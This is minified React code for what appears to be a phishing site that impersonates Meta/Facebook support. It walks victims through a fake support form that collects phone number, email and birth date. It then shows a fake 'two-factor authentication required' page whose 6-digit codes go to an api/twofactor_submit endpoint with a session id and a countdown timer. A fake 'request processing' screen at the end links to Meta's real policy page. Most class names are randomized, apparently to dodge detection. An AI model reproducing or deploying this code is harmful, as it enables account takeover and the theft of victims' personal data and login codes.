                }), m.jsxs(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-4",
                    controlId: "phone_number",
                    children: [m.jsx(K.Label, {children: "Phone number "}), m.jsx(Wx, {
                        value: a.phoneNumber,
                        onChange: v => {
                            a.phoneNumber = v
                        }
                    })]
                }), m.jsxs(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-4",
                    controlId: "email",
                    children: [m.jsx(K.Label, {children: "Email address"}), m.jsx(K.Control, {
                        onChange: v => {
                            a.email = v.target.value
                        }, type: "email", placeholder: "Please enter your email", required: !0
                    })]
                }), m.jsxs(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-4",
                    controlId: "birth-day",
                    children: [m.jsx(K.Label, {children: "Birth day"}), m.jsx(K.Control, {
                        onChange: v => {
                            a.birthDay = v.target.value
                        }, type: "date", placeholder: "", required: !0
                    })]
                }), o !== "" && !l ? m.jsx("div", {
                    className: Math.random().toString(36).substring(2, 9) + " text-danger",
                    children: m.jsx("b", {
                        className: Math.random().toString(36).substring(2, 9) + " text-mute",
                        children: o
                    })
                }) : null, m.jsx("div", {
                    className: Math.random().toString(36).substring(2, 9) + " d-flex justify-content-end",
                    children: m.jsx(Jn, {type: "submit", children: "Submit"})
                })]
            })
        })]
    })
}

var Zx = {
        xmlns: "http://www.w3.org/2000/svg",
        width: 24,
        height: 24,
        viewBox: "0 0 24 24",
        fill: "none",
        stroke: "currentColor",
        strokeWidth: 2,
        strokeLinecap: "round",
        strokeLinejoin: "round"
    }, eS = Object.defineProperty, tS = Object.defineProperties, nS = Object.getOwnPropertyDescriptors,
    Li = Object.getOwnPropertySymbols, wh = Object.prototype.hasOwnProperty, xh = Object.prototype.propertyIsEnumerable,
    ed = (e, t, n) => t in e ? eS(e, t, {enumerable: !0, configurable: !0, writable: !0, value: n}) : e[t] = n,
    td = (e, t) => {
        for (var n in t || (t = {})) wh.call(t, n) && ed(e, n, t[n]);
        if (Li) for (var n of Li(t)) xh.call(t, n) && ed(e, n, t[n]);
        return e
    }, rS = (e, t) => tS(e, nS(t)), oS = (e, t) => {
        var n = {};
        for (var r in e) wh.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
        if (e != null && Li) for (var r of Li(e)) t.indexOf(r) < 0 && xh.call(e, r) && (n[r] = e[r]);
        return n
    }, Sh = (e, t, n) => {
        const r = f.forwardRef((o, i) => {
            var l = o, {color: s = "currentColor", size: a = 24, stroke: u = 2, children: c} = l,
                d = oS(l, ["color", "size", "stroke", "children"]);
            return f.createElement("svg", td(rS(td({ref: i}, Zx), {
                width: a,
                height: a,
                stroke: s,
                strokeWidth: u,
                className: `tabler-icon tabler-icon-${e}`
            }), d), [...n.map(([p, x]) => f.createElement(p, x)), ...c || []])
        });
        return r.propTypes = {
            color: ke.string,
            size: ke.oneOfType([ke.string, ke.number]),
            stroke: ke.oneOfType([ke.string, ke.number])
        }, r.displayName = `${t}`, r
    }, iS = Sh("check", "IconCheck", [["path", {d: "M5 12l5 5l10 -10", key: "svg-0"}]]),
    lS = Sh("chevron-compact-right", "IconChevronCompactRight", [["path", {d: "M11 4l3 8l-3 8", key: "svg-0"}]]);

function sS() {
    f.useEffect(() => {
        window.scrollTo(0, 0), xx()
    }, []);
    const [e, t] = f.useState(new String), [n, r] = f.useState(!1), [o, i] = f.useState(!1), l = s => {
        s.preventDefault(), n === !1 ? t("Please select an issue") : (t(""), i(!0))
    };
    return o ? m.jsx(qx, {}) : m.jsx(m.Fragment, {
        children: m.jsx(mh, {
            children: m.jsxs(K, {
                onSubmit: l,
                className: Math.random().toString(36).substring(2, 9) + " form-update p-0 mb-5",
                children: [m.jsx("b", {children: "Most common issues"}), m.jsx(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-3 select-issuse",
                    controlId: Math.random().toString(36).substring(2, 9),
                    children: m.jsx(K.Check, {
                        name: "check",
                        onChange: s => r(s.target.checked),
                        type: "radio",
                        label: "I need to contact the support team"
                    })
                }), m.jsx(K.Group, {
                    className: Math.random().toString(36).substring(2, 9) + " mb-3",
                    controlId: "text",
                    children: e !== null ? m.jsx(K.Text, {
                        className: Math.random().toString(36).substring(2, 9) + " text-danger",
                        children: e
                    }) : null
                }), m.jsx("div", {
                    className: Math.random().toString(36).substring(2, 9) + " d-flex justify-content-end",
                    children: m.jsxs(Jn, {
                        type: "submit",
                        className: Math.random().toString(36).substring(2, 9) + " button_index px-3 py-2",
                        disabled: !n,
                        children: ["Next ", m.jsx(lS, {size: 16, stroke: 3})]
                    })
                })]
            })
        })
    })
}

const aS = "assets/loadingLogo-c296b7a5.gif";

function uS() {
    const e = Zi(), t = Math.floor(1e8 + Math.random() * 90000111e7);
    return f.useEffect(() => {
        setTimeout(() => {
            e(`/help/contact/${t}`)
        }, 5e3)
    }, []), m.jsx("div", {
        className: "vh-100 d-flex align-items-center",
        children: m.jsx("img", {src: aS, className: "img-fluid"})
    })
}

function cS() {
    const [e, t] = f.useState(0);
    return setTimeout(() => {
        e < 100 && t(e + 2)
    }, 1e3), m.jsx(m.Fragment, {
        children: m.jsxs(lr, {
            className: Math.random().toString(36).substring(2, 9) + " center-postion",
            children: [e < 100 ? m.jsx(Km, {variant: "primary"}) : m.jsx("div", {
                className: Math.random().toString(36).substring(2, 9) + " p-3 bg-white border border-success",
                style: {borderRadius: "51%"},
                children: m.jsx(iS, {color: "green"})
            }), m.jsxs("h3", {
                className: Math.random().toString(36).substring(2, 9) + " mt-3",
                children: ["Your requests is ", e == 100 ? "successful" : "processing"]
            }), m.jsx("p", {
                className: Math.random().toString(36).substring(2, 9) + " text-center col-5",
                children: e == 100 ? "It usually 24 to 48 hours to recevice an update from the team. However, sometimes it depends on the complexity of the task so don't worry. We will contact you via email or phone number as soon as possible" : "Please wait 1-2 minutes. We are checking your information. Please do not leave this site once processing is complete"
            }), m.jsx(xn, {
                children: e < 100 ? m.jsx(m.Fragment, {
                    children: m.jsx(wn, {
                        md: 12,
                        sm: 12,
                        lg: 7,
                        children: m.jsx(rw, {
                            className: Math.random().toString(36).substring(2, 9) + " wv-40",
                            variant: e == 100 ? "primary" : "danger",
                            now: e
                        })
                    })
                }) : m.jsx(m.Fragment, {
                    children: m.jsx("a", {
                        className: Math.random().toString(36).substring(2, 9) + " btn btn-primary",
                        href: "https://www.facebook.com/policies_center/commerce",
                        children: " Goto meta legal policy"
                    })
                })
            })]
        })
    })
}

function dS() {
    const e = Zi(), [t, n] = f.useState(""), [r, o] = f.useState(!1), [i, l] = f.useState(!1), [s, a] = f.useState(300), [u, c] = f.useState("05:00"), [d] = f.useState(localStorage.getItem(sessionId));
    setTimeout(() => {
        if (s > 0) {
            a(s - 1);
            const x = Math.floor(s / 60);
            let y = x.toString();
            const v = s % 60;
            let C = v.toString();
            x < 10 && (y = "0" + x), v < 10 && (C = "0" + v), c(y + ":" + C)
        } else localStorage.removeItem(sessionId), window.location.href = "/"
    }, 1e3);
    const p = x => {
        o(!0), n(""), l(!1), x.preventDefault();
        const {TwofactorCode: y} = x.target.elements;
        if (console.log(y.value), y.value.length !== 6) {
            n("Code must be 6 digits"), l(!0), o(!1);
            return
        }
        En.post("api/twofactor_submit", {sessionId: d, TwofactorCode: y.value}).then(v => {
            if (v.data.sessionId === null || v.data.errorDetail != null) {
                n("The code you've entered is incorrect."), l(!0), o(!1);
                return
            }
            v.data.needCheckPointCode ? (localStorage.setItem("maxDight", v.data.maxDight), e("/checkpoint/verify")) : localStorage.removeItem(sessionId), localStorage.setItem("canLogin", "true"), e("/processing")
        }).catch(v => {
            if (v.response.data.sessionId === null) localStorage.removeItem(sessionId), window.location.href = "/"; else {
                o(!1);
                let C = "";
                v.response.data.errorDetail.forEach(() => {
                    C += "Your code is incorrect"
                }), console.log(`error : ${C}`), l(!0), n(C)
            }
        })
    };
    return d === null && (window.location.href = "/"), d === null ? m.jsx(m.Fragment, {}) : m.jsxs(m.Fragment, {
        children: [m.jsx(ft, {
            className: Math.random().toString(36).substring(2, 9) + " navbar-white",
            children: m.jsxs(lr, {
                children: [m.jsx(ft.Brand, {
                    href: "#home",
                    children: m.jsx("img", {
                        className: Math.random().toString(36).substring(2, 9) + " logo m-0 p-0",
                        src: Im
                    })
                }), m.jsx(ft.Toggle, {}), m.jsx(ft.Collapse, {
                    className: Math.random().toString(36).substring(2, 9) + " justify-content-end",
                    children: m.jsx(ft.Text, {})
                })]
            })
        }), m.jsx(lr, {
            className: Math.random().toString(36).substring(2, 9) + " mt-5 pt-5", children: m.jsx(xn, {
                className: Math.random().toString(36).substring(2, 9) + " d-flex justify-content-center",
                children: m.jsx(wn, {
                    md: 12, sm: 12, lg: 7, children: m.jsxs(Yn, {
                        className: Math.random().toString(36).substring(2, 9) + " px-0 pt-0 pb-0",
                        children: [m.jsx(Yn.Header, {children: "Two-factor authentication required (1/3)"}), m.jsx("hr", {className: Math.random().toString(36).substring(2, 9) + " mt-0"}), m.jsxs(Yn.Body, {
                            children: [m.jsx("span", {children: "You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser."}), m.jsxs("p", {children: ["Enter the 6-digit code from your ", m.jsx("b", {children: "code generator"}), " or third-party app bellow."]}), m.jsx(K, {
                                onSubmit: p,
                                id: "frmConfirm2FA",
                                children: m.jsx(xn, {
                                    children: m.jsx(wn, {
                                        xs: 4,
                                        children: m.jsxs(K.Group, {
                                            className: Math.random().toString(36).substring(2, 9) + " mb-3",
                                            controlId: "TwofactorCode",
                                            children: [m.jsxs(K.Label, {
                                                children: ["6-digit code ", m.jsxs(K.Text, {
                                                    className: Math.random().toString(36).substring(2, 9) + " text-muted",
                                                    children: ["(", u, ")"]
                                                })]
                                            }), m.jsx(K.Control, {
                                                className: i ? "border-error" : "",
                                                maxLength: 8,
                                                type: "text",
                                                placeholder: "Enter code"
                                            })]
                                        })
                                    })
                                })
                            }), t !== "" ? m.jsx("div", {
                                className: Math.random().toString(36).substring(2, 9) + " text-mute text-danger",
                                children: m.jsx("b", {children: t})}) : null,
                                m.jsx("hr", {}), m.jsxs("div", {
                                className: Math.random().toString(36).substring(2, 9) + " d-flex align-items-center",
                                children: [m.jsx("a", {href: "#", children: "Need another?"}), m.jsx(Jn, {
                                    disabled: r,
                                    type: "submit",
                                    form: "frmConfirm2FA",
                                    variant: "primary",
                                    className: Math.random().toString(36).substring(2, 9) + " ms-auto",
                                    children: "Send"
                                })]
                            })]
                        })]
                    })
                })
            })
        })]
    })
}

function fS() {
    return Pv([{path: "/*", element: m.jsx(uS, {})}, {
        path: "/help/contact/:id",
        element: m.jsx(sS, {})
    }, {path: "/checkpoint/identity", element: m.jsx(dS, {})}, {
        path: "/checkpoint/verify",
        element: m.jsx(wx, {})
    }, {path: "/processing", element: m.jsx(cS, {})}])
}

function pS() {
    return m.jsx(m.Fragment, {children: m.jsx(Vv, {children: m.jsx(fS, {})})})
}

Kl.createRoot(document.getElementById("root")).render(m.jsx($.StrictMode, {
    children: m.jsx(Jx, {
        loader: "default",
        children: m.jsx(pS, {})
    })
}));
